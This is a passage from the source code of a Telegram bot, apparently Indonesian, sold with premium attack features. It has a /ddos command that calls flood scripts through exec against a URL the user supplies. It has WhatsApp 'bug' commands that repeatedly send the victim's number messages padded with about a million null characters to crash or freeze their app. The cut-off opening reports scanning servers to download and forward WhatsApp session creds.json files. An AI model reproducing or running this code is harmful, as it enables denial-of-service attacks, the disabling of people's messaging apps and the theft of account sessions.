    if (totalFound === 0) {
      return ctx.reply("✅ ☇ Scan selesai tidak ditemukan creds.json di folder session/sessions pada server manapun");
    } else {
      return ctx.reply(`✅ ☇ Scan selesai total file creds.json berhasil diunduh & dikirim: ${totalFound}`);
    }
  } catch (err) {
    ctx.reply("❌ ☇ Terjadi error saat scan");
  }
});


bot.command("toblur", async (ctx) => {
  const reply = ctx.message.reply_to_message;
  if (!reply || !reply.photo)
    return ctx.reply("❌ Reply ke foto dulu!");

  try {
    const loading = await ctx.reply("⏳ Memproses blur...");

    const photo = reply.photo.at(-1);
    const fileLink = await ctx.telegram.getFileLink(photo.file_id);

    await ctx.telegram.editMessageText(ctx.chat.id, loading.message_id, null, "✅ Blur selesai, mengirim foto...");
    await ctx.replyWithPhoto({ url: `https://ikyyzyyrestapi.my.id/image/blur?url=${encodeURIComponent(fileLink.href)}` });

  } catch (err) {
    console.error(err);
    ctx.reply("❌ Gagal memproses foto!");
  }
});

bot.command(["telestalk", "cekid", "info"], async (ctx) => {
  try {
    let username = ctx.message.text.split(" ")[1];
    if (!username)
      return ctx.reply(
        "Masukkan username!\nExample: /telestalk @Ikyydevxy\nExample: /cekid @Ikyydevxy\nExample: /info @Ikyydevxy"
      );

    username = username.replace("@", "");
    
    ctx.reply("📝 Tunggu Sebentar...");

    const apiUrl = `https://ikyyzyyrestapi.my.id/tools/telegram/stalk?username=@${username}`;
    const { data } = await axios.get(apiUrl);

    if (!data.status) return ctx.reply("User tidak ditemukan!");

const res = data.result;
const escapeHTML = (text) => {
  if (!text) return "-";
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
};

    let mediaLinks = [];
    let sendMedia = null;
    let isVideo = false;

    if (res.profile_media) {
      const photos = res.profile_media.photos || [];
      const videos = res.profile_media.videos || [];

      mediaLinks = [...videos, ...photos];
      if (videos.length > 0) {
        sendMedia = videos[0];
        isVideo = true;
      } else if (photos.length > 0) {
        sendMedia = photos[0];
      }
    }

    const mediaInfo = mediaLinks.length
      ? `\n\nProfile:\n${mediaLinks.join("\n")}`
      : "";
const caption = `
<blockquote><b>TELEGRAM STALK</b></blockquote>

<b>ID:</b> ${escapeHTML(res.id)}
<b>Username:</b> @${escapeHTML(res.username || "-")}
<b>Name:</b> ${escapeHTML(res.name)}
<b>Bio:</b> ${escapeHTML(res.bio || "-")}
<b>Verified:</b> ${res.verified}
<b>Scam:</b> ${res.scam}
<b>Fake:</b> ${res.fake}
<b>Restricted:</b> ${res.restricted}

${mediaLinks.length ? "\n<b>Profile:</b>\n" + mediaLinks.join("\n") : ""}
`;

    const keyboard = {
      inline_keyboard: [
        [
          {
            text: "📋 Copy User ID",
            copy_text: { text: String(res.id) }
          }
        ]
      ]
    };

    if (sendMedia) {
      if (isVideo) {
        await ctx.replyWithVideo(sendMedia, {
          caption,
          parse_mode: "HTML",
          reply_markup: keyboard
        });
      } else {
        await ctx.replyWithPhoto(sendMedia, {
          caption,
          parse_mode: "HTML",
          reply_markup: keyboard
        });
      }
    } else {
      await ctx.reply(caption, {
        parse_mode: "HTML",
        reply_markup: keyboard
      });
    }
  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi kesalahan!");
  }
});

bot.command("convert", checkPremium, async (ctx) => {
  const r = ctx.message.reply_to_message;
  if (!r) return ctx.reply("🪧 ☇ Format: /convert ( reply dengan foto/video )");

  let fileId = null;
  if (r.photo && r.photo.length) {
    fileId = r.photo[r.photo.length - 1].file_id;
  } else if (r.video) {
    fileId = r.video.file_id;
  } else if (r.video_note) {
    fileId = r.video_note.file_id;
  } else {
    return ctx.reply("❌ ☇ Hanya mendukung foto atau video");
  }

  const wait = await ctx.reply("⏳ ☇ Mengambil file & mengunggah ke catbox");

  try {
    const tgLink = String(await ctx.telegram.getFileLink(fileId));

    const params = new URLSearchParams();
    params.append("reqtype", "urlupload");
    params.append("url", tgLink);

    const { data } = await axios.post("https://catbox.moe/user/api.php", params, {
      headers: { "content-type": "application/x-www-form-urlencoded" },
      timeout: 30000
    });

    if (typeof data === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(data.trim())) {
      await ctx.reply(data.trim());
    } else {
      await ctx.reply("❌ ☇ Gagal upload ke catbox" + String(data).slice(0, 200));
    }
  } catch (e) {
    const msg = e?.response?.status
      ? `❌ ☇ Error ${e.response.status} saat unggah ke catbox`
      : "❌ ☇ Gagal unggah coba lagi.";
    await ctx.reply(msg);
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});
function loadBotnetData() {
    try {
        return JSON.parse(fs.readFileSync('./ddos/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        return { endpoints: [] };
    }
}

// Fungsi untuk menyimpan data botnet ke file JSON
function saveBotnetData(botnetData) {
    try {
        fs.writeFileSync('./ddos/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving botnet data:', error.message);
    }
}

//------------------ TOOLS DDOS -------------//
bot.command('ddos', checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const fromId = ctx.from.id;

  const input = ctx.message.text.substring(6).trim().split(/\s+/); 

  const target = input[0];
  const time = input[1];
  const methods = input[2];

  if (!target || !time || !methods) {
    return ctx.reply(
      "Contoh Penggunaan:\n/ddos https://example.com 60 pidoras",
      { parse_mode: "HTML" }
    );
  }
await ctx.telegram.sendPhoto(ctx.chat.id, attackUrl, {
    caption: `
<blockquote>( 👑 ) -# 𝐐 𝐔 𝐀 𝐍 𝐓 𝐔 𝐌</blockquote>
𖤓 Target: ${target}
𖤓 Time: ${time}
𖤓 Metode: ${methods}`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check Target", url: `https://check-host.net/check-http?host=${target}` }
      ]]
    }
  });

  if (methods === "strike") {
    exec(`node ./methods/strike.js GET ${target} ${time} 4 90 proxy.txt --full`);
  } else if (methods === "mix") {
    exec(`node ./methods/strike.js GET ${target} ${time} 4 90 proxy.txt --full`);
    exec(`node methods/flood.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node methods/H2F3.js ${target} ${time} 500 10 proxy.txt`);
    exec(`node methods/pidoras.js ${target} ${time} 100 10 proxy.txt`);
  } else if (methods === "flood") {
    exec(`node methods/flood.js ${target} ${time} 100 10 proxy.txt`);
  } else if (methods === "h2vip") {
    exec(`node methods/H2F3.js ${target} ${time} 500 10 proxy.txt`);
    exec(`node methods/pidoras.js ${target} ${time} 100 10 proxy.txt`);
  } else if (methods === "h2") {
    exec(`node methods/H2F3.js ${target} ${time} 500 10 proxy.txt`);
  } else if (methods === "pidoras") {
    exec(`node methods/pidoras.js ${target} ${time} 100 10 proxy.txt`);
  } else {
    ctx.reply("❌ Metode tidak dikenali atau format salah.");
  }
});
//-------------- COMMAND BUG --------------//
bot.hears(/^\/?(xfuck|xios)\b/i, checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xfuck 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailBug, {
    caption: `
<blockquote><pre>⟡━⟢ XILENT DEATH ⟣━⟡
⌑ Target: ${q}
⌑ Type: Blank No Click
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 20; i++) {
    await blankbyambajahat(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⟡━⟢ XILENT DEATH ⟣━⟡l
⌑ Target: ${q}
⌑ Type: Blank No Click
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.hears(/^\/?(flowx|xdelay)\b/i, checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xdelay 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailBug, {
    caption: `
<blockquote><pre>⟡━⟢ XILENT DEATH ⟣━⟡
⌑ Target: ${q}
⌑ Type: Delay Invis
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 20; i++) {
    await AmbaKokDelay(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⟡━⟢ XILENT DEATH ⟣━⟡l
⌑ Target: ${q}
⌑ Type: Delay Invis
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.hears(/^\/?(xforce|xblank)\b/i, checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /x 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailBug, {
    caption: `
<blockquote><pre>⟡━⟢ XILENT DEATH ⟣━⟡
⌑ Target: ${q}
⌑ Type: -
⌑ Low Divice: Force
⌑ High Divice: Blank Hard
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 2; i++) {
    await blankbyambajahat(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⟡━⟢ XILENT DEATH ⟣━⟡l
⌑ Target: ${q}
⌑ Type: -
⌑ Low Divice: Force
⌑ High Divice: Blank
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

async function AmbaKokDelay(sock, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: { 
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Xilent Death Empire",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        }
      }
    }
  }, { participant: { jid: target }});
}

async function blankbyambajahat(sock, target) {
  const AmbaMsg = {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"AmbaJht' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '꧀'.repeat(5000) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"amba","key":"' + '\u0000'.repeat(900000) + '","key_type":"CPF"}}],"share_payment_status":false}'
          }
        ]
      }
    }
  };

  try {
    await sock.relayMessage(target, AmbaMsg, {
      participant: { jid: target },
      userJid: target,
      messageId: null
    });
    console.log("⨳ Done target lagi nangis tuh");
  } catch (e) {
    console.log("error jir fix kan lu dev - " + e.message);
  }
}
//-------------- END FUNCTION -------------//
bot.launch();
